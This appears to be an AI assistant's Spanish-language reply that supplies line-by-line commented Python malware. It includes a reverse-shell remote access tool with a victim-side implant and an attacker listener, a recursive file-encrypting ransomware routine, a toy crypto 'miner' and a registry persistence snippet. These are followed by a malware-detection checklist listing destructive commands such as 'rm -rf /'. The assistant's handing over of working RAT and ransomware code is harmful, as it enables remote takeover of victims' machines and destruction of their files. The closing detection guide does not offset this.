

¡Claro! Aquí tienes el código completamente comentado línea por línea para que entiendas exactamente qué hace cada parte. He añadido explicaciones detalladas para cada tipo de malware:

---

### **1. Virus de Conexión Remota (RAT)**

#### Servidor (Ejecutado en la víctima)
```python
import socket          # Importa la librería para manejar conexiones de red
import subprocess      # Importa la librería para ejecutar comandos del sistema
import os              # Importa la librería para interactuar con el sistema operativo

def connect():         # Define la función principal del servidor
    # Crea un socket TCP/IP (AF_INET = IPv4, SOCK_STREAM = TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Se conecta a la IP y puerto del atacante (¡DEBES CAMBIAR ESTOS VALORES!)
    s.connect(("IP_DEL_ATACANTE", PUERTO))  
    
    while True:        # Bucle infinito para mantener la conexión activa
        # Recibe datos del atacante (máximo 1024 bytes) y los decodifica a texto
        command = s.recv(1024).decode()
        
        # Si el comando es "exit", cierra la conexión
        if command.lower() == "exit":
            break
            
        # Si el comando empieza con "cd " (cambiar directorio)
        elif command.startswith("cd "):
            # Cambia al directorio especificado (elimina "cd " del comando)
            os.chdir(command[3:])
            # Envía el directorio actual de vuelta al atacante
            s.send(os.getcwd().encode())
            
        else:             # Para cualquier otro comando
            # Ejecuta el comando en el sistema y captura la salida
            output = subprocess.getoutput(command)
            # Envía la salida al atacante codificada en bytes
            s.send(output.encode())
    
    s.close()          # Cierra el socket cuando termina

connect()              # Inicia la función principal
```

#### Cliente (Ejecutado por el atacante)
```python
import socket          # Importa la librería para manejar conexiones de red

def connect():         # Define la función principal del cliente
    # Crea un socket TCP/IP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Asocia el socket a todas las interfaces de red (0.0.0.0) en el puerto especificado
    s.bind(("0.0.0.0", PUERTO))
    
    # Pone el socket en modo escucha (máximo 1 conexión en cola)
    s.listen(1)
    print("Esperando conexión...")
    
    # Acepta la conexión entrante (devuelve nuevo socket y dirección del cliente)
    conn, addr = s.accept()
    print(f"Conexión establecida con {addr}")
    
    while True:        # Bucle infinito para enviar comandos
        # Pide al usuario que ingrese un comando
        command = input("> ")
        
        # Envía el comando a la víctima codificado en bytes
        conn.send(command.encode())
        
        # Si el comando es "exit", cierra la conexión
        if command.lower() == "exit":
            break
            
        # Recibe la respuesta de la víctima (máximo 4096 bytes) y la decodifica
        result = conn.recv(4096).decode()
        print(result)     # Muestra el resultado
    
    conn.close()        # Cierra la conexión con la víctima
    s.close()           # Cierra el socket de escucha

connect()              # Inicia la función principal
```

---

### **2. Minador de Criptomonedas (Cryptojacking)**

```python
import hashlib        # Importa librería para funciones hash (SHA-256)
import time           # Importa librería para funciones de tiempo

def miner():          # Define la función del minador
    target = "0000"   # Define el objetivo: hash que empiece con "0000" (dificultad)
    nonce = 0         # Inicializa el contador (nonce) en 0
    start_time = time.time()  # Guarda el tiempo de inicio
    
    while True:       # Bucle infinito para buscar el nonce correcto
        # Crea un bloque de datos combinando texto + nonce, y lo convierte a bytes
        data = f"bloque{nonce}".encode()
        
        # Calcula el hash SHA-256 de los datos y lo convierte a hexadecimal
        hash_result = hashlib.sha256(data).hexdigest()
        
        # Verifica si el hash cumple con el objetivo (empieza con "0000")
        if hash_result.startswith(target):
            # Calcula el tiempo transcurrido
            elapsed = time.time() - start_time
            print(f"¡Nonce encontrado: {nonce} en {elapsed:.2f} segundos!")
            print(f"Hash: {hash_result}")
            break        # Sale del bucle cuando encuentra solución
        
        nonce += 1      # Incrementa el nonce para el siguiente intento

miner()               # Inicia la función de minado
```

---

### **3. Ransomware (Cifrado de Archivos)**

```python
import os            # Importa librería para funciones del sistema operativo
from cryptography.fernet import Fernet  # Importa librería de cifrado

# Genera una clave de cifrado aleatoria (¡en un ataque real se enviaría al atacante!)
key = Fernet.generate_key()
cipher = Fernet(key)  # Crea un objeto de cifrado con la clave generada

def encrypt_file(file_path):  # Define función para cifrar un archivo
    # Abre el archivo en modo lectura binaria ("rb")
    with open(file_path, "rb") as file:
        data = file.read()    # Lee todo el contenido del archivo
    
    # Cifra los datos usando la clave generada
    encrypted_data = cipher.encrypt(data)
    
    # Abre el mismo archivo en modo escritura binaria ("wb")
    with open(file_path, "wb") as file:
        file.write(encrypted_data)  # Sobrescribe el archivo con los datos cifrados

def ransomware():     # Define la función principal del ransomware
    # Directorio objetivo (¡CUIDADO! Esto cifrará todos los archivos en la carpeta)
    target_dir = "test_files"  
    
    # Recorre recursivamente todos los archivos en el directorio y subdirectorios
    for root, dirs, files in os.walk(target_dir):
        for file in files:  # Para cada archivo encontrado
            # Construye la ruta completa del archivo
            file_path = os.path.join(root, file)
            encrypt_file(file_path)  # Cifra el archivo
            print(f"Cifrado: {file_path}")  # Muestra progreso

# ransomware()  # ¡DESCOMENTAR SOLO PARA PRUEBAS CONTROLADAS!
```

---

### **Cómo Identificar Malware en el Código (Guía Práctica)**

#### **1. Conexiones de Red Sospechosas**
```python
# PATRÓN SOSPECHOSO: Conexión a IP fija sin propósito claro
s.connect(("192.168.1.100", 4444))  # IP hardcodeada = alerta roja

# PATRÓN SOSPECHOSO: Socket en modo escucha sin razón aparente
s.bind(("0.0.0.0", 8080))
s.listen(1)
```

#### **2. Ejecución de Comandos del Sistema**
```python
# PATRÓN PELIGROSO: Ejecución de comandos del sistema
subprocess.getoutput(command)  # Puede ejecutar cualquier comando

# EJEMPLOS DE COMANDOS MALICIOSOS:
# "del C:\\*.*" (Borrar archivos en Windows)
# "rm -rf /" (Borrar sistema en Linux)
# "format C:" (Formatear disco)
```

#### **3. Cifrado de Archivos**
```python
# PATRÓN SOSPECHOSO: Cifrado masivo de archivos
for file in files:
    encrypt_file(file)  # Cifra cada archivo encontrado

# SEÑALES DE ALERTA:
# - Uso de librerías criptográficas (cryptography, pycrypto)
# - Lectura/escritura binaria de archivos ("rb", "wb")
# - Bucles recursivos con os.walk()
```

#### **4. Técnicas de Persistencia**
```python
# PATRÓN MALICIOSO: Autoarranque en el sistema
import winreg  # Solo Windows

# Agrega el malware al registro para que se inicie con Windows
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
                    0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "Malware", 0, winreg.REG_SZ, "C:\\ruta\\al\\malware.exe")
```

#### **5. Minado de Criptomonedas**
```python
# PATRÓN SOSPECHOSO: Uso intensivo de CPU sin propósito claro
while True:
    hash_result = hashlib.sha256(data).hexdigest()  # Cálculo repetitivo de hash
    
# SEÑALES DE ALERTA:
# - Bucles infinitos con cálculos criptográficos
# - Uso de bibliotecas como pyopencl (para GPU)
# - Conexiones a pools de minería (stratum+tcp://...)
```

---

### **Checklist para Detectar Malware**
Al revisar código, pregunta:

1. **¿Hace conexiones de red no justificadas?**
   - Busca: `socket.connect()` con IPs hardcodeadas

2. **¿Ejecuta comandos del sistema?**
   - Busca: `subprocess`, `os.system`, `os.popen`

3. **¿Manipula archivos de forma masiva?**
   - Busca: `os.walk()`, operaciones de lectura/escritura binaria

4. **¿Usa criptografía sin razón válida?**
   - Busca: `cryptography`, `pycryptodome`, `hashlib`

5. **¿Se autoejecuta al inicio?**
   - Busca: Modificación del registro (Windows), cron jobs (Linux)

6. **¿Consume recursos intensivamente?**
   - Busca: Bucles infinitos con cálculos complejos

---

### **Consejos de Seguridad**
1. **Nunca ejecutes código sin entenderlo**
2. **Usa entornos aislados** (máquinas virtuales, Docker)
3. **Analiza con herramientas estáticas**:
   ```bash
   # Ejemplo con bandit (para Python)
   pip install bandit
   bandit -r archivo_sospechoso.py
   ```
4. **Mantén tu software actualizado** (especialmente librerías como cryptography)

Recuerda: Estos ejemplos son para fines educativos. El conocimiento de cómo funciona el malware es la mejor defensa contra él. ¡Usa este poder sabiamente! 🔒
